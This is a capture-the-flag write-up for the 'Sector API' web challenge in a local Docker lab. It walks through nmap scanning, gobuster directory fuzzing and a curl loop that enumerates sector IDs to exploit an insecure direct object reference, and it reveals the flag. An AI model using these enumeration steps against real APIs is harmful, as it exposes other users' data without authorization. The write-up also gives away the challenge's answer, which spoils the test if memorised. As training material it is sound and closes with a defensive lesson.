# Sector API

> Field telemetry dashboard. Download the lab zip (Google Drive) and run it on Kali/Linux with Docker.
> `chmod +x startlab.sh` `./startlab.sh blackout-web03.tar`
> The script displays the lab IP (172.18.0.2). Enumerate with nmap and attack via HTTP. Do not expose the container to the internet.
> **Tip:** enumerate the lab IP with nmap. The field dashboard loads telemetry for your zone.

**Flag:** `WHOAMI{id0r_s3ct0r21}`

---

## Solution

The lab is a web application for energy telemetry (LATAM Energy Grid). Each operator is assigned a "sector" and the field dashboard displays telemetry for their zone through an API. The flaw is that the API does not verify whether the sector you request belongs to your operator: requesting a restricted sector reveals the flag.

### 1. Start the lab

```bash
$ chmod +x startlab.sh
$ ./startlab.sh blackout-web03.tar
```

The Docker container starts and the script prints its IP. In my environment it was `172.17.0.2`.

### 2. Enumerate with nmap

```bash
$ nmap -sV 172.17.0.2
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.68 (Debian)
```

A single web service on port 80.

### 3. Browse the app and log in as an operator

When requesting the root, the HTML already displays the **navigation bar** with the five pages:

```bash
$ curl -s http://172.17.0.2/ | grep btn-nav
<a class="btn-nav active" href="/index.php">Inicio</a>
<a class="btn-nav" href="/estado.php">Estado red</a>
<a class="btn-nav" href="/tablero.php">Tablero</a>
<a class="btn-nav" href="/comunidad.php">Comunidad</a>
<a class="btn-nav" href="/contacto.php">Contacto</a>
```

The field dashboard requires logging in as an operator:

```bash
$ curl -X POST -d "entrar=1" -c cookies.txt http://172.17.0.2/tablero.php
```

This creates a PHP session and returns the dashboard with your assigned sector (sector 14).

### 4. Discover the `/api` directory with gobuster

The menu pages do not mention any API, so we fuzz for hidden directories:

```bash
$ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -t 50
api        (Status: 301)
assets     (Status: 301)
includes   (Status: 301)
index.php  (Status: 200)
```

A `/api/` directory appears that is not linked from the menu — this is the challenge's attack surface.

### 5. Discover the API endpoint

The dashboard page loads a script, `/assets/tablero.js`, that makes the actual telemetry request:

```javascript
fetch('/api/sector/' + encodeURIComponent(id) + '/telemetry', { credentials: 'same-origin' })
```

The endpoint is `/api/sector/{id}/telemetry`. Testing it with an active session for your sector:

```bash
$ curl -b cookies.txt http://172.17.0.2/api/sector/14/telemetry
{"id":14,"nombre":"Norte","estado":"OFFLINE","carga_mw":"0","nota":"Apagon sector 14. Esperando sync."}
```

### 6. Enumerate sectors (IDOR)

The endpoint does not verify that the requested sector belongs to the operator. We enumerate IDs to see which sectors exist:

```bash
$ for i in {1..50}; do curl -s -b cookies.txt http://172.17.0.2/api/sector/$i/telemetry; echo; done
```

| ID | Name | Status |
|----|------|--------|
| 11 | Occidente | DEGRADADO |
| 12 | Sur | OPERATIVO |
| 13 | Central | OPERATIVO |
| 14 | Norte | OFFLINE |
| 15 | Oriente | ALERTA |
| 16 | Costa | OPERATIVO |
| 21 | Respaldo gerencia | RESTRINGIDO |

### 7. Read the flag from the restricted sector

Sector 21 (`RESTRINGIDO`) is the exception: instead of telemetry it returns a Base64 string inside `nota`:

```json
{"id":21,"nombre":"Respaldo gerencia","estado":"RESTRINGIDO","carga_mw":"n\/d","nota":"V0hPQU1Je2lkMHJfczNjdDByMjF9"}
```

Decoding:

```bash
$ echo "V0hPQU1Je2lkMHJfczNjdDByMjF9" | base64 -d
WHOAMI{id0r_s3ct0r21}
```

## Lesson

A REST endpoint that uses a direct resource ID (`/api/sector/{id}`) must validate that the ID belongs to the authenticated user; session authentication alone is not enough, because it allows reading other users' resources by enumerating IDs (IDOR).

---

*Part of the **Blackout LATAM** CTF by [Whoami-Labs](https://whoami-labs.com/).*
